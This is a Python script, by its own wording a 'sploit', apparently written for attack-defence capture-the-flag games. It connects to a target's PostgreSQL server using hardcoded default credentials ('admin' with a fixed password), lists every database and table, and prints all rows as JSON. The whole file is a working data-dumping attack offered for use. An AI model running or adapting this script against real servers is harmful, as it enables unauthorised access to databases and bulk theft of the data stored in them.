#!/usr/bin/env python3

import json
import os
import sys
from typing import Any, Dict, Iterable, List, Optional, Tuple

DEFAULT_PG_USER = "admin"
DEFAULT_PG_PASSWORD = "S3cr3tP4ssw0rd"
DEFAULT_PG_PORT = 5432
DEFAULT_PG_DB = "postgres"

try:
    import psycopg2
    import psycopg2.extras
    from psycopg2 import OperationalError, sql
except Exception:
    psycopg2 = None
    OperationalError = Exception
    sql = None


def eprint(*args: Any, **kwargs: Any) -> None:
    print(*args, file=sys.stderr, **kwargs)


def connect(dbname: str, host: str, user: str, password: str, port: int):
    assert psycopg2 is not None
    return psycopg2.connect(
        dbname=dbname,
        host=host,
        user=user,
        password=password,
        port=port,
        connect_timeout=3,
    )


def list_databases(conn) -> List[str]:
    dbs: List[str] = []
    try:
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT datname
                FROM pg_database
                WHERE datistemplate = false
                ORDER BY datname
                """
            )
            dbs = [row[0] for row in cur.fetchall()]
    except Exception as ex:
        eprint(f"[!] Failed to list databases: {ex}")
    return dbs


def list_tables(conn) -> List[Tuple[str, str]]:
    """Return [(schema, table), ...] for all base tables user can read."""
    tables: List[Tuple[str, str]] = []
    try:
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT table_schema, table_name
                FROM information_schema.tables
                WHERE table_type='BASE TABLE'
                  AND table_schema NOT IN ('pg_catalog', 'information_schema')
                ORDER BY table_schema, table_name
                """
            )
            tables = [(r[0], r[1]) for r in cur.fetchall()]
    except Exception as ex:
        eprint(f"[!] Failed to list tables: {ex}")
    return tables


def stream_table_rows(conn, schema: str, table: str, batch: int = 1000) -> Iterable[Dict[str, Any]]:
    """Yield rows as dicts for given schema.table in batches."""
    try:
        with conn.cursor(name=f"cur_{schema}_{table}", cursor_factory=psycopg2.extras.DictCursor) as cur:
            identifier = f'"{schema}"."{table}"'
            cur.itersize = batch
            cur.execute(f"SELECT * FROM {identifier}")
            while True:
                rows = cur.fetchmany(batch)
                if not rows:
                    break
                for row in rows:
                    yield dict(row)
    except Exception as ex:
        eprint(f"[!] Failed to read {schema}.{table}: {ex}")
        return


def dump_all_pg(host: str, user: str, password: str, port: int) -> None:
    if psycopg2 is None:
        eprint("psycopg2 is not installed, please `pip install psycopg2-binary` to run this sploit")
        return
    try:
        root_conn = connect(DEFAULT_PG_DB, host, user, password, port)
        root_conn.autocommit = True
    except OperationalError as ex:
        eprint(f"[!] Connection error to postgres@{host}:{port}: {ex}")
        return
    except Exception as ex:
        eprint(f"[!] Unexpected error connecting to postgres@{host}:{port}: {ex}")
        return

    try:
        dbs = list_databases(root_conn)
    finally:
        try:
            root_conn.close()
        except Exception:
            pass

    for db in dbs:
        try:
            conn = connect(db, host, user, password, port)
            conn.autocommit = True
        except Exception as ex:
            eprint(f"[!] Failed connecting to db={db}: {ex}")
            continue

        try:
            tables = list_tables(conn)
            for schema, table in tables:
                for row in stream_table_rows(conn, schema, table):
                    try:
                        print(
                            json.dumps(
                                {
                                    "db": db,
                                    "schema": schema,
                                    "table": table,
                                    "row": row,
                                },
                                default=str,
                            ),
                            flush=True,
                        )
                    except Exception as jex:
                        eprint(f"[!] JSON encode error for {db}.{schema}.{table}: {jex}")
                        continue
        finally:
            try:
                conn.close()
            except Exception:
                pass


def main() -> int:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        return 1

    target_host = sys.argv[1]

    pg_user = os.getenv("PGUSER", DEFAULT_PG_USER)
    pg_password = os.getenv("PGPASSWORD", DEFAULT_PG_PASSWORD)
    try:
        pg_port = int(os.getenv("PGPORT", str(DEFAULT_PG_PORT)))
    except ValueError:
        pg_port = DEFAULT_PG_PORT

    dump_all_pg(target_host, pg_user, pg_password, pg_port)
    return 0


if __name__ == "__main__":
    sys.exit(main())
